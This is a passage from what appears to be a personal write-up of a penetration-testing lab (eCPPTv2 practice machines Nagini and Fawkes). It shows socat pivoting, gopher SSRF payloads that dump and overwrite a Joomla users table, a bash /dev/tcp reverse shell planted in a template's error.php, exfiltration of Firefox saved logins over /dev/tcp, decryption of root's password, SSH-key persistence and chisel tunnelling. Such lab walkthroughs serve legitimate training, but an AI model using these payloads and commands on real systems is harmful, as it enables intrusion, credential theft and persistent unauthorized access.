Ok, so here we are getting something interesting: `/internalResourceFeTcher.php`. Let's access it on our browser:

![](/assets/img/eCPPTv2/11.png)

If we look at the `http3` message, we can see that developers must not put any `.bak` files because they are readeble for everyone, that's pretty interesting.

Another notable thing is that this web is calling to **other** websites, so this seems to be an `SSRF` attack:

![](/assets/img/eCPPTv2/12.png)

We can see that is calling for the `Aragog` website, but the image isn't loading because it's trying to load it **locally**; so here the idea is to point to our attacker's website, so there we could load a `php` file that would be interpreted on the `Nagini` web. But what is the problem?

![](/assets/img/eCPPTv2/14.png)

As we can see in this graphic, to access the attacker's website from `Nagini`'s machine, we would need to somehow redirect the connections on the `Aragog` machine. To perform this we are going to use [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat):

```bash
root@Aragog:~# wget http://192.168.0.111/socat
--2023-06-05 21:46:58--  http://192.168.0.111/socat
Connecting to 192.168.0.111:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

socat                                                   100%[===============================================================================================================================>] 366.38K  --.-KB/s    in 0.004s  

2023-06-05 21:46:58 (90.6 MB/s) - ‘socat’ saved [375176/375176]

root@Aragog:~# chmod +x socat
root@Aragog:~# 
```

Now, we are going to create an `index.html` file that contains `hello this is a test`. After that, we need to create a python web server:

```zsh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Great, now with `socat` on the `Aragog` machine we are going to run the following command:

```bash
root@Aragog:~# ./socat TCP-LISTEN:8080,fork TCP:192.168.0.111:80
```

What this will do is to whatever request that gets on the 8080 port, it will redirect to our attacker's IP:80. This means that if in the `Nagini` web we put `http://192.168.56.6:8080` (Aragog's vboxnet0 IP) it will redirect to our attacker's web server, so if everything goes well we should get on the `Hello this is a test` message on `Nagini`'s web:

![](/assets/img/eCPPTv2/15.png)

Great!!! We can doble-check by looking at our python server:

![](/assets/img/eCPPTv2/16.png)

It works!! 
Ok, but we don't want to see "hello this is a test", we want to execute commands on the `Nagini` machine. So, because the web can run `php`, let's create a simple `php` script that executes the command `whoami`, let's see if it works:

```php
<?php
        system("whoami");
?>
```

Again, start the web server and try to access the web tacking on advantage of `socat`:

![](/assets/img/eCPPTv2/17.png)

As we can see, the `php` code is not being interpreted, so I think that the `RCE` is not possible for this way.

## Joomla exploiting
---

Remember that we've been using `gobuster` to enumerate directories? Well, if you remember, you might know that we saw a `/joomla` directory. 
There is a tool called [joomscan](https://github.com/OWASP/joomscan) that we can clone into our attacker machine:

```zsh
❯ git clone https://github.com/OWASP/joomscan.git
Clonando en 'joomscan'...
remote: Enumerating objects: 375, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (22/22), done.
remote: Total 375 (delta 11), reused 4 (delta 0), pack-reused 353
Recibiendo objetos: 100% (375/375), 279.99 KiB | 1.44 MiB/s, listo.
Resolviendo deltas: 100% (183/183), listo.

❯ cd joomscan

❯ ls
CHANGELOG.md  core  Dockerfile  exploit  joomscan.pl  LICENSE.md  love.txt  modules  README.md  reports  version
```

This script is coded in `perl` so we can execute it with `perl joomscan.pl`:

```perl
#!/usr/bin/perl
#
#            --------------------------------------------------
#                            OWASP JoomScan
#            --------------------------------------------------
#        Copyright (C) <2018>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#


$author="Mohammad Reza Espargham , Ali Razmjoo";$author.="";
$version="0.0.7";$version.="";
$codename="Self Challenge";$codename.="";
$update="2018/09/23";$update.="";
$mmm=0;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');
use if $^O eq "MSWin32", Win32::Console::ANSI;
use Term::ANSIColor;
use Getopt::Long;
use LWP;
use LWP::UserAgent;
use LWP::Simple;
use Cwd;                                                                       
$mepath = Cwd::realpath($0); $mepath =~ s#/[^/\\]*$##; 
$SIG{INT} = \&interrupt;
sub interrupt {
    fprint("\nShutting Down , Interrupt by user");
    do "$mepath/core/report.pl" if($noreport!=1);
    print color("reset");
    exit 0;
}

do "$mepath/core/header.pl";

if ($urlfile) {
   open(my $ufh, '<:encoding(UTF-8)', $urlfile)
     or die "Could not open file '$urlfile' $!";
    
   while (my $row = <$ufh>) {
     chomp $row;
     $target = $row;
     run_checks(0);
   }   
} else {
   run_checks(0);
}

sub run_checks {

   do "$mepath/core/main.pl";
   
   if($jversion!=1) {
      do "$mepath/modules/waf_detector.pl";
      do "$mepath/exploit/jckeditor.pl";
   }
   
   do "$mepath/core/ver.pl";
   if($jversion!=1) {
      
      do "$mepath/exploit/verexploit.pl"; 
      do "$mepath/exploit/com_lfd.pl";
      do "$mepath/modules/pathdisclure.pl";
      do "$mepath/modules/debugmode.pl";
      do "$mepath/modules/dirlisting.pl"; 
      do "$mepath/modules/missconfig.pl";
      do "$mepath/modules/cpfinder.pl"; 
      do "$mepath/modules/robots.pl"; 
      do "$mepath/modules/backupfinder.pl"; 
      do "$mepath/modules/errfinder.pl"; 
      do "$mepath/modules/reg.pl"; 
      do "$mepath/modules/configfinder.pl"; 
      do "$mepath/exploit/components.pl" if($components==1);

   }

   do "$mepath/core/report.pl" if($noreport!=1);
   print color("reset");

}
```

When we execute it, it'll ask for an URL, so let's input the URL.

```zsh
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.56.7/joomla ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.25

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://192.168.56.7/joomla/administrator/components
http://192.168.56.7/joomla/administrator/modules
http://192.168.56.7/joomla/administrator/templates
http://192.168.56.7/joomla/tmp
http://192.168.56.7/joomla/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.56.7/joomla/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.56.7/joomla/robots.txt 

Interesting path found from robots.txt
http://192.168.56.7/joomla/joomla/administrator/
http://192.168.56.7/joomla/administrator/
http://192.168.56.7/joomla/bin/
http://192.168.56.7/joomla/cache/
http://192.168.56.7/joomla/cli/
http://192.168.56.7/joomla/components/
http://192.168.56.7/joomla/includes/
http://192.168.56.7/joomla/installation/
http://192.168.56.7/joomla/language/
http://192.168.56.7/joomla/layouts/
http://192.168.56.7/joomla/libraries/
http://192.168.56.7/joomla/logs/
http://192.168.56.7/joomla/modules/
http://192.168.56.7/joomla/plugins/
http://192.168.56.7/joomla/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found 
 config file path : http://192.168.56.7/joomla/configuration.php.bak



Your Report : reports/192.168.56.7/
```

Hm, interesting. We can see a `.bak` file, remember the info we got earlier with `quiche`? Well, I think that's what the admin said to **not to do**. Let's see that file: 

```php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joomla CMS';
        public $editor = 'tinymce';
        public $captcha = '0';               
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $debug_lang_const = '1';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

## SSRF - Success
---

We can notice also that we have access to a login panel:

![](/assets/img/eCPPTv2/18.png)

Remember that we got an `SSRF`, and here there is a username (goblin) and a database (joomla). By researching a little bit I found about `gopher://`:

![](/assets/img/eCPPTv2/19.png)

Ok, so we can use the tool [gopherus](https://github.com/tarunkant/Gopherus) to enumerate things on the database:

```zsh
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: SHOW databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%53%48%4f%57%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------, smtp, zabbix,
                     pymemcache, rbmemcache, phpme
```

We can input this provided link into the `Nagini`'s web:

>**Note:** You may need to refresh the page a few times.

![](/assets/img/eCPPTv2/21.png)

Nice! At the very ending we can see the `joomla` database, which is the one we interest:

```zsh
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; SHOW tables;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%53%48%4f%57%20%74%61%62%6c%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

Same procedure:

![](/assets/img/eCPPTv2/22.png)

All right! Now we want to enumerate the `joomla_users` table:

```zsh
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; describe joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%64%65%73%63%72%69%62%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

As always...

![](/assets/img/eCPPTv2/23.png)

Perfect! Now let's list the content of the interesting tables:

```zsh
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; select name,username,email,password from joomla_users;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%43%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%6e%61%6d%65%2c%75%73%65%72%6e%61%6d%65%2c%65%6d%61%69%6c%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

![](/assets/img/eCPPTv2/24.png)

Perfect!!! We can see that `site_admin` has a hash, so let's copy it and try to crack it:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:26 0.02% (ETA: 2023-06-09 20:36) 0g/s 49.87p/s 49.87c/s 49.87C/s delgado..marsha
Session aborted
```

Ok, so we've been unable to crack it, but, now the idea is: we can read data, but if we have privileges, we can **change** data.
First, we are going to generate a new password:

```zsh
❯ echo -n "password123" | md5sum
482c811da5d5b4bc6d497ffa98491e38  -
```

Now, with `gopherus` we are going to set the new password for `site_admin`:

```zsh
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%55%53%45%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%34%38%32%63%38%31%31%64%61%35%64%35%62%34%62%63%36%64%34%39%37%66%66%61%39%38%34%39%31%65%33%38%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

![](/assets/img/eCPPTv2/25.png)

Nice! Now let's try to connect to the admin panel of `joomla`:

![](/assets/img/eCPPTv2/26.png)

GREAT!!! We can access to this admin panel!! 

## Gaining access - (www-data)
---

When you are on a `joomla` panel, to gain access to the server is quite simple cause its always the same:

- First we need to go to the `extensions > templates` tab:

![](/assets/img/eCPPTv2/27.png)

- Now open any template, for example this one:

![](/assets/img/eCPPTv2/28.png)

- Now edit the `error.php` file so when an error occurs, it will send us a reverse shell. This is how the `error.php` file would look like:

```php
<?php
/**
 * @package     Joomla.Site
 * @subpackage  Templates.protostar
 *
 * @copyright   Copyright (C) 2005 - 2020 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

system("bash -c 'bash -i >& /dev/tcp/192.168.56.6/4343 0>&1'")
defined('_JEXEC') or die;

/** @var JDocumentError $this */

$app  = JFactory::getApplication();
$user = JFactory::getUser();

// Getting params from template
$params = $app->getTemplate(true)->params;
**truncated**
```

You might say, "hey Ruy, but the `Nagini` machine can't communicate with our attacker machine directly..." Well, as we did earlier, we are going to use again `socat` to redirect the connections:

![](/assets/img/eCPPTv2/29.png)

Now the next step would be to make an intended error, so when the error occurs, the connection will be redirected to our port 443 and we'll gain a `reverse shell`. To make the error occurs, we can simply input `http://192.168.56.7/joomla/index.php/aasdfasdfasdf`:

![](/assets/img/eCPPTv2/30.png)

And we get a shell as `www-data`!! 

## Lateral movement - Snape
---

After treating the `TTY`, we can see a courious file on `/home/sname` directory:

```zsh
www-data@Nagini:/home/snape$ ls -la
total 36
drwxr-xr-x 4 snape snape 4096 Jun  6 00:44 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw------- 1 snape snape   20 Jun  6 00:44 .bash_history
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ 
```

If we do `cat .creds.txt` we'll notice that is a `base64` string, which we can decode and we'll obtain `snape`'s password:

```zsh
www-data@Nagini:/home/snape$ cat .creds.txt | base64 -d; echo
Love@lilly
www-data@Nagini:/home/snape$ su snape
Password: 
snape@Nagini:~$ 
```

Easy.

## Lateral movement - Hermione
---

In `/home/hermoine/bin` we can see an `SUID` binary which is a copy of the `cp` binary, so the idea is to create an `authorized_keys` file with our ssh public key and copy it into the `/home/hermoine/.ssh/authorized_keys`:

```zsh
snape@Nagini:/home/hermoine/bin$ nano /tmp/authorized_keys
snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys /home/hermoine/.ssh/authorized_keys
snape@Nagini:/home/hermoine/bin$ 
```

As we can see, it seems that everything was successfull so let's try to connect now via ssh:

```zsh
❯ proxychains -q ssh hermoine@192.168.56.7
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun  6 01:13:46 2023 from 192.168.56.6
hermoine@Nagini:~$ 
```

Perfect. 

## Privilege escalation
---

In Hermoine's home directory we can see a `.mozzilla` path. This seems interesting, because there are tools such as [firepwd](https://github.com/lclevy/firepwd.git) that allows us to gather more information.
For this tool working properly we need the `key4.db` and the `logins.json` files, so to get those files into our machine we need to do the following:

- On attacker's machine:

```zsh
❯ nc -lvnp 1234 > logins.json
listening on [any] 1234 ...
```

- On `Aragog` machine:

```zsh
root@Aragog:~# ./socat TCP-LISTEN:4848,fork TCP:192.168.0.111:1234
```

- On `Nagini` machine:

```zsh
hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat < logins.json > /dev/tcp/192.168.56.6/4848
```

Now in our attacker's machine we should get the `logins.json` file:

```zsh
❯ nc -lvnp 1234 > logins.json
listening on [any] 1234 ...
connect to [192.168.0.111] from (UNKNOWN) [192.168.0.114] 48578

❯ ls
firepwd.py  LICENSE  logins.json  mozilla_db  mozilla_pbe.pdf  mozilla_pbe.svg  readme.md  requirements.txt
```

Now, let's do the same thing but instead of doing it with `logins.json` file we are going to do it with `key4.db` file.

When we got both files, we can execute `firepwd.py` and check the output:

```zsh
❯ python3 firepwd.py
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```

Ok, so at the very ending we can see root's password, so let's connect via `ssh`:

```zsh
❯ proxychains -q ssh root@192.168.56.7
root@192.168.56.7's password: 
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 18:01:59 2021
root@Nagini:~# 
```

Rooted!

## Establishing persistence (Nagini)
---

This is the same procedure as we did on `Aragog` machine, copy your `id_rsa.pub` into the `/root/.ssh/authorized_keys` and there you go.

```zsh
❯ proxychains -q ssh root@192.168.56.7
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun  6 01:39:09 2023 from 192.168.56.6
root@Nagini:~# 
```

# Fawkes
---

![](/assets/img/eCPPTv2/fawkes.png)

---

For some reason, we can't install `arp-scan`, don't worry, we can do the same thing but with a `bash` script:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Quitting...\n"
    tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c INT

tput civis
for i in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 192.168.57.$i" &>/dev/null && echo "[+] HOST - 192.168.57.$i - Active" &
done; wait
tput cnorm
```

This script will base on the exit code to check if the host is up or down:

```bash
root@Nagini:~# ./hostDiscovery.sh
[+] HOST - 192.168.57.7 - Active
[+] HOST - 192.168.57.6 - Active
[+] HOST - 192.168.57.2 - Active
[+] HOST - 192.168.57.1 - Active
root@Nagini:~# 
```

Ok, so even this script report us 4 more IPs, there are only two of them. The other two are the virtualbox application (192.168.57.1) and the other one is the DHCP server of virtualbox (192.168.57.2).

First we are going to attack the `Fawkes` machine, which is a **Linux** system (192.168.57.7)
Our network graph should be looking something like this:

![](/assets/img/eCPPTv2/31.png)

## Tunnelling network interface `vboxnet1` to `wlan0`
--- 

The idea is to create a `socks5` connection from the `Nagini` machine to our attacker's machine, so to achieve that we will first need to get `chisel` on the `Nagini` machine:

```zsh
❯ proxychains -q scp chisel root@192.168.56.7:/root/chisel
chisel                                                                                                                      100% 8188KB  38.8MB/s   00:00    

❯ proxychains -q ssh root@192.168.56.7
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun  6 19:11:53 2023 from 192.168.56.6
root@Nagini:~# ls
chisel	horcrux3.txt  hostDiscovery.sh
root@Nagini:~# 
```

Now, with `socat` we are going to redirect the connections of the port **2322** to the `chisel` main server on our machine (port **9001**):

```zsh
root@Aragog:~# ./socat TCP-LISTEN:2322,fork TCP:192.168.0.111:9001
```

Now we are going to launch `chisel` on `Nagini`'s machine:

```zsh
root@Nagini:~# ./chisel client 192.168.56.6:2322 R:8888:socks
```

And by looking at our `chisel` main server, we can notice a new socks connection on port **8888**:

```zsh
❯ chisel server --reverse -p 9001
2023/06/06 15:55:57 server: Reverse tunnelling enabled
2023/06/06 15:55:57 server: Fingerprint nbQk/9HgqeZ3r9W/s6gO6tn/PXW6yBtlgBNNA/S4aNQ=
2023/06/06 15:55:57 server: Listening on http://0.0.0.0:9001
2023/06/06 15:57:56 server: session#11: tun: proxy#R:127.0.0.1:8888=>socks: Listening
```

Now in our `/etc/proxychains.conf` file we need to uncomment the `dinamyc-chain` option and comment the `static-chain` option:

![](/assets/img/eCPPTv2/32.png)

>**Note:** The latest proxy must be on top of the other proxyes, like this:

![](/assets/img/eCPPTv2/33.png)

With this setted up, we can try to ping the machie to see if the tunnel was successfully established:

```zsh
❯ proxychains -q ping -c 1 192.168.57.7
PING 192.168.57.7 (192.168.57.7) 56(84) bytes of data.
64 bytes from 192.168.57.7: icmp_seq=1 ttl=64 time=0.504 ms

--- 192.168.57.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.504/0.504/0.504/0.000 ms
```

